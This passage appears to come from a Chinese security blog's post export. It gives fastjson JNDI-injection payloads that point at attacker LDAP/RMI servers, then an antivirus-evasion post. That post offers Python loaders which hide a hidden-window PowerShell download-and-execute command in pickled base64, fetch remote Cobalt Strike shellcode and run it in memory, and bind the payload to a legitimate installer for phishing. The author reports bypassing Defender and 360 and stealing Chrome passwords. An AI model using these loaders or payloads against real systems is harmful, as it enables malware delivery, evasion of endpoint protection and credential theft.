class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://192.168.30.51:9999/Exploit&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>即可。</p>
<p><img src="/posts/32c3cb6e/001.png" alt="image-20200506161748536"></p>
<h2 id="高版本JDK"><a href="#高版本JDK" class="headerlink" title="高版本JDK"></a>高版本JDK</h2><p>高版本的java对jndi注入进行了限制，由于环境的不同，存在一些方法进行绕过，这里推荐下国外Michael Stepankin大牛的方法。<span class="exturl" data-url="aHR0cHM6Ly93d3cudmVyYWNvZGUuY29tL2Jsb2cvcmVzZWFyY2gvZXhwbG9pdGluZy1qbmRpLWluamVjdGlvbnMtamF2YQ==">https://www.veracode.com/blog/research/exploiting-jndi-injections-java<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="第一步：工具准备"><a href="#第一步：工具准备" class="headerlink" title="第一步：工具准备"></a>第一步：工具准备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mpgn/Spring-Boot-Actuator-Exploit</span><br><span class="line"><span class="comment"># 修改Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java的代码。可以修改RMI远程监听的端口，和执行的系统命令。</span></span><br><span class="line"><span class="built_in">cd</span> Spring-Boot-Actuator-Exploit</span><br><span class="line"><span class="built_in">cd</span> maliciousRMIServer</span><br><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<h3 id="第二步：RMI"><a href="#第二步：RMI" class="headerlink" title="第二步：RMI"></a>第二步：RMI</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.30.51 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass杀软</title>
    <url>/posts/ccfc56a5/</url>
    <content><![CDATA[<p>分离免杀</p>
<a id="more"></a>



<p>参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvc2Q3M2VMMy1Ubk1tMHpXTENDOGNPUQ==">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ<i class="fa fa-external-link-alt"></i></span></p>
<p>文章的思路可借鉴</p>
<p>借鉴稳思路，并发展。</p>
<p><strong>注意⚠️：pyinstaller被拉黑了。。。</strong></p>
<blockquote>
<p>总是自己实验过才知道，要么就是写个工具。</p>
</blockquote>
<h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><p>利用反序列化加载powershell。</p>
<ol>
<li>复制文件，运行，得到序列化后的对象</li>
<li>将序列化模块的代码注释，启用反序列化模块</li>
<li>序列化后的对象(payload)，放在反序列化模块的paylaod中。</li>
</ol>
<p><strong>过DEF，360卫士，没测试火绒。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## -------------------------反序列化模块--------------</span></span><br><span class="line"><span class="comment">## -----将序列化生成的值，放在payload中即可。-----------</span></span><br><span class="line"><span class="comment">## 打包方式 :  pyinstall --noconsole -F bypass03.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class Pay():</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#     	self.unsearize()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#     def unsearize(self):</span></span><br><span class="line"><span class="comment">#         payload_ = b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line"><span class="comment">#         res_ = pickle.loads(payload_)</span></span><br><span class="line"><span class="comment">#         # # # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line"><span class="comment">#         os.system(base64.b64decode(res_[&#x27;pay&#x27;]).decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     p = Pay()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------序列化模块---------------------</span></span><br><span class="line"><span class="comment"># ------ 序列化模块，将输出的结果放入反序列化中payload中-----</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    	self.unsearize()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABAOwA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># 输出序列化的结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br></pre></td></tr></table></figure>



<h2 id="第二种-变种"><a href="#第二种-变种" class="headerlink" title="第二种(变种)"></a>第二种(变种)</h2><p><strong>过DEF，360卫士，没测试火绒。</strong></p>
<p>和正常文件捆绑（适用于钓鱼），分离出文件（文件为正常的可执行文件，比如QQ安装包）</p>
<ol>
<li>将paylaod放在searize()函数中，运行程序，得到序列化后的payload。</li>
<li>将序列化后的payload放在<code>unsearize</code>中</li>
<li>将正常的安装或者可执行文件读取并进行base64编码(放在set_exe函数中)</li>
<li>注释掉<code>__init__</code>中的<code>self.searize</code>,启用<code># self.thread()</code></li>
<li>打包即可（多余注释代码，想删即删）</li>
</ol>
<p>代码中的set_payload函数()为直接执行payload,我没测试。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      self.searize</span><br><span class="line">      <span class="comment"># self.thread()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_exe</span>(<span class="params">self</span>):</span></span><br><span class="line">        exe_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&#x27;C:/7z.exe&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            s = base64.b64decode(exe_base64)</span><br><span class="line">            f.write(s)</span><br><span class="line">        os.system()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 启用两个线程，一个运行payload,一个运行正常的程序</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        t1 =  threading.Thread(target=self.unsearize())</span><br><span class="line">        t2 = threading.Thread(target=self.set_exe)</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">        t1.join()</span><br><span class="line">        t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置上线的payload，直接调用，不进行任何的操作。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># print(s)</span></span><br><span class="line">        os.system(s)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 序列化内容为paylaod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searize</span>(<span class="params">self</span>):</span></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABzA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># 输出序列化的结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">## -----------------反序列化执行模块-----------------</span></span><br><span class="line">        <span class="comment">##---------将序列化后的paylaod放在unsearize的paylaod中-------------</span></span><br><span class="line">        <span class="comment">## -----------将searize()函数删除或者注释，并将下面的unsearize()函数启用。</span></span><br><span class="line">        <span class="comment">## 打包 : pyinstaller --noconsole -F bypass02.py</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line">        payload_ = <span class="string">b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line">        res_ = pickle.loads(payload_)</span><br><span class="line">        <span class="comment"># # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line">        os.system(base64.b64decode(res_[<span class="string">&#x27;pay&#x27;</span>]).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2><p><strong>360卫士，没测试火绒。</strong>好像没有过DEF，实验时候忘记了，没再复测，排除法确定是这个。</p>
<p>注意⚠️：远程shellcode(CS生成C语言的payload之后，对其base64编码，然后去掉b’’,只保留内容类似<code>/EiD5PDoy==</code>)</p>
<ol>
<li>首先定义了shellcode，为一串python代码。</li>
<li>定义了一个类，<code>__reduce__</code>在被<strong>反序列化</strong>的时候执行，<strong>反序列化</strong>exec执行的内容为shellcode定义的代码</li>
<li>修改shellcode中的请求URL(CS生成的C语言payload)，然后对类进行序列化。输出序列化的结果，payload</li>
<li>注释上面序列化的代码，启用反序列还模块，将刚刚生成的payload写入其中。打包即可。</li>
</ol>
<p>分离免杀的思想，文件中真正代码为反序列化模块，代码量极小。代码打包后仅仅是加载器。用来加载远程shellcode</p>
<p>将shellcode放在远程服务器中，开启Web服务。执行加载器即可。</p>
<p>会自动下载shellcode,然后开辟内存并执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">import ctypes,urllib.request,codecs,base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = urllib.request.urlopen(&#x27;http://10.10.12.189:8000/payload.c&#x27;).read()</span></span><br><span class="line"><span class="string">shellcode = base64.b64decode(shellcode)</span></span><br><span class="line"><span class="string">shellcode =codecs.escape_decode(shellcode)[0]</span></span><br><span class="line"><span class="string">shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="string"># 申请内存</span></span><br><span class="line"><span class="string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 放入shellcode</span></span><br><span class="line"><span class="string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    buf, </span></span><br><span class="line"><span class="string">    ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line"><span class="string">handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 等待上面创建的线程运行完</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="keyword">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br><span class="line"><span class="comment"># ret_decode = base64.b64decode(ret_base64)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## ---------- 分隔符----------</span></span><br><span class="line"><span class="comment">## 替换上述代码中的URL地址。改地址是CS中生成的C语言的paylaod</span></span><br><span class="line"><span class="comment">## 上面代码运行后得到payload,然后将上面代码全部注释</span></span><br><span class="line"><span class="comment">## 将payload放在下面代码的payload中，</span></span><br><span class="line"><span class="comment">## pyinstaller 打包即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import base64,pickle,ctypes,urllib.request,codecs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;gASVVwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFg4BAAAIAppbXBvcnQgY3R5cGVzLHVybGxpYi5yZXF1ZXN0LGNvZGVjcyxiYXNlNjQKCnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly8xMC4xMC4xMi4xODk6ODAwMC9wYXlsb2FkLmMnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5jX2ludCgweDQwKSkKCiMg5pS+5YWlc2hlbGxjb2RlCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgYnVmLCAKICAgIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkKKQojIOWIm+W7uuS4gOS4que6v+eoi+S7jnNoZWxsY29kZemYsuatouS9jee9rummluWcsOWdgOW8gOWni+aJp+ihjApoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKIyDnrYnlvoXkuIrpnaLliJvlu7rnmoTnur/nqIvov5DooYzlrowKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkplIWUUpQu&#x27;</span></span><br><span class="line"><span class="comment"># pickle.loads(base64.b64decode(payload))</span></span><br></pre></td></tr></table></figure>



<h2 id="第四种-bypass360全家桶-DEF"><a href="#第四种-bypass360全家桶-DEF" class="headerlink" title="第四种(bypass360全家桶+DEF)"></a>第四种(bypass360全家桶+DEF)</h2><p>PY打包pyinstaller被列入黑名单了，建议用其他打包py2exe,但是我本地py2exe打不成一个单独的文件，所以放弃了</p>
<p>pyinstall  -F x.py（不报毒）</p>
<p>注意：加上<code>--noconsole</code>立马报毒，但是不加会有黑窗口弹出。</p>
<p>pyinstall –noconsole -F x.py（报毒）</p>
<p>直接用类加载shellcode，省去了序列化和反序列化的过程。。。。。。</p>
<p>注意⚠️：远程shellcode(CS生成C语言的payload之后，对其base64编码，然后去掉b’’,只保留内容类似<code>/EiD5PDoy==</code>)</p>
<p>访问远程的shellcode,然后申请内存，直接执行。。。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.set_payload()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        shellcode = urllib.request.urlopen(<span class="string">&#x27;http://10.10.12.189:8000/payload.c&#x27;</span>).read()</span><br><span class="line">        shellcode = base64.b64decode(shellcode)</span><br><span class="line">        shellcode =codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">        shellcode = bytearray(shellcode)</span><br><span class="line">        <span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">        <span class="comment"># 申请内存</span></span><br><span class="line">        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 放入shellcode</span></span><br><span class="line">        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            buf, </span><br><span class="line">            ctypes.c_int(len(shellcode))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">        handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第四种方法的测试截图："><a href="#第四种方法的测试截图：" class="headerlink" title="第四种方法的测试截图："></a>第四种方法的测试截图：</h3><p>CS正常上线，读取hash正常。</p>
<p><img src="/posts/ccfc56a5/image-20210122112552869.png" alt="image-20210122112552869"></p>
<p><strong>上传下载正常</strong></p>
<p><img src="/posts/ccfc56a5/image-20210122112923431.png" alt="image-20210122112923431"></p>
<p><strong>读取chrome密码正常：</strong></p>
<p><img src="/posts/ccfc56a5/image-20210122113847166.png" alt="image-20210122113847166"></p>
<p>该方法在360杀毒的7版本没事，但是在5版本给干掉了。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>
]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
